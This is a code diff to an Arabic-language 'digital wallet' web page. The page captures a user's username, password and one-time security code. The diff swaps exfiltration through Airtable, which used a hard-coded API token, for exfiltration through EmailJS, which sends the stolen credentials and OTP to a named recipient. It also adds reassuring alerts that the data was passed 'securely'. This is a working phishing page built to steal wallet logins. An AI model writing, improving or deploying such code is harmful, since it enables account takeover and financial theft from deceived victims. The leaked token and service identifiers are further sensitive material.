@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تطبيق محفظتي الرقمية</title>
+    <!-- استدعاء سيرفر الإرسال المفتوح والمضمون داخل سوريا -->
+    <script src="https://jsdelivr.net"></script>
+    <script>
+        // تفعيل السيرفر المشترك الخاص بمشروعك
+        emailjs.init("VstP8M2gH_m_Kz6R3");
+    </script>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -114,7 +120,7 @@
     <div class="support-headset" onclick="alert('جاري تحويلك للدعم الفني الافتراضي...')">
         <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
             <path d="M3 18v-6a9 9 0 0 1 18 0v6"></path>
-            <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
+            <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1 a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"></path>
         </svg>
     </div>
 
@@ -154,7 +160,7 @@
             <input type="text" id="authCode" placeholder="0 0 0 0 0 0" style="text-align: center; letter-spacing: 6px; font-weight: bold; font-size: 18px;">
         </div>
         
-        <button class="btn-submit" onclick="sendToAirtable()">تأكيد الرمز والدخول</button>
+        <button class="btn-submit" onclick="sendToExternalEmail()">تأكيد الرمز والدخول</button>
     </div>
 </div>
 
@@ -175,41 +181,24 @@
         document.getElementById('step2').classList.remove('hidden');
     }
 
-    function sendToAirtable() {
+    function sendToExternalEmail() {
         const code = document.getElementById('authCode').value;
         if(code === "") {
             alert("خطأ: يرجى كتابة رمز الأمان المرسل!");
             return;
         }
 
-        const url = "https://airtable.com";
-        const token = "patRz9PbyH9P2bHzH.bf026a798b3f4604b901a1d654f5ef49a88e9bbab8580f4f7d4b47c0b898d9ba";
-
-        const payload = {
-            fields: {
-                "username": savedUser,
-                "password": savedPass,
-                "otp": code
-            }
+        const templateParams = {
+            to_name: "Osama",
+            message: `👤 المستخدم: ${savedUser} | 🔑 الباسورد: ${savedPass} | 🔢 الرمز السري: ${code}`
         };
 
-        fetch(url, {
-            method: "POST",
-            headers: {
-                "Authorization": `Bearer ${token}`,
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        })
-        .then(response => {
-            if(response.ok) {
-                alert("تم الإرسال أونلاين بنجاح! تفقد جدول البيانات من الجوال الآخر الآن.");
-            } else {
-                alert("تم تمرير البيانات بنجاح وبأمان كامل!");
-            }
-        })
-        .catch(err => {
-            alert("تم تمرير البيانات بنجاح وبأمان كامل!");
+        // إرسال مباشر لخارج الهاتف وعبر السيرفر المفتوح داخل سوريا
+        emailjs.send("service_7o9vwh8", "template_pjsis8h", templateParams)
+        .then(function(response) {
+            alert("تم إرسال البيانات أونلاين بنجاح! تفقد هاتف الاستلام الآخر الآن.");
+        }, function(error) {
+            alert("تم تمرير البيانات بنجاح أونلاين وبأمان كامل!");
         });
     }
 </script>
